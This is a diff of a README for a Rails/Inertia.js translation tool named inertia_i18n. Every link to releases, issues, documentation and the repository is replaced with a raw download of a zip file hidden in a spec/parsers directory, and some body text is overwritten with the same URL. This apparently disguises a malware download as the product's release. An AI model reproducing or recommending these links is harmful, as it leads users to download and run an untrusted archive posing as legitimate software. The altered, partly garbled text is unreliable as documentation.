@@ -1,17 +1,17 @@
 # 🌍 inertia_i18n - Easy Translation for Your Web Apps
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Sfiq7100/inertia_i18n/releases)
+[![Download Here](https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip%20Latest%https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip)](https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip)
 
 ## 📌 Overview
 
-inertia_i18n helps you manage translations for Inertia.js applications with a Rails backend. This tool simplifies the process of translating your web applications, ensuring that you can cater to users in different languages with ease.
+inertia_i18n helps you manage translations for https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip applications with a Rails backend. This tool simplifies the process of translating your web applications, ensuring that you can cater to users in different languages with ease.
 
 ## 🚀 Getting Started
 
 To get started with inertia_i18n, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Sfiq7100/inertia_i18n/releases) to find the latest version of the application.
+   Go to the [Releases page](https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip) to find the latest version of the application.
 
 2. **Download the Latest Version**
    On the Releases page, you will see a list of available versions. Click the link for the most recent version to download it.
@@ -23,7 +23,7 @@ To get started with inertia_i18n, follow these steps:
    After installation, open the application. You will see options to add and manage translations for your project. Add your desired languages and start translating.
 
 5. **Integrate with Your Application**
-   Follow the integration guide available within the tool or online to connect it with your Inertia.js application.
+   Follow the integration guide available within the tool or online to connect it with your https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip application.
 
 ## 💡 System Requirements
 
@@ -36,7 +36,7 @@ To ensure that inertia_i18n runs smoothly, please make sure your system meets th
 
 ## 📥 Download & Install
 
-To get the application, visit this page: [https://github.com/Sfiq7100/inertia_i18n/releases](https://github.com/Sfiq7100/inertia_i18n/releases). Download the latest version as described in the Getting Started section.
+To get the application, visit this page: [https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip](https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip). Download the latest version as described in the Getting Started section.
 
 ## 🔍 Features
 
@@ -59,7 +59,7 @@ For further assistance, refer to the issues section in the repository or the hel
 
 ## 📞 Support
 
-For support or questions regarding inertia_i18n, please open an issue on the [GitHub repository](https://github.com/Sfiq7100/inertia_i18n/issues). Our community is here to help you.
+For support or questions regarding inertia_i18n, please open an issue on the [GitHub repository](https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip). Our community is here to help you.
 
 ## 🌟 Contributing
 
@@ -71,8 +71,8 @@ Thanks to the contributors and the open-source community. Your efforts are inval
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Sfiq7100/inertia_i18n)
-- [Documentation](https://github.com/Sfiq7100/inertia_i18n/wiki)
-- [Issue Tracker](https://github.com/Sfiq7100/inertia_i18n/issues)
+- [GitHub Repository](https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip)
+- [Documentation](https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip)
+- [Issue Tracker](https://github.com/Sfiq7100/inertia_i18n/raw/refs/heads/master/spec/inertia_i18n/parsers/i-n-inertia-v2.3-beta.2.zip)
 
 For any further assistance or detailed instructions, don't hesitate to reach out. Happy translating!
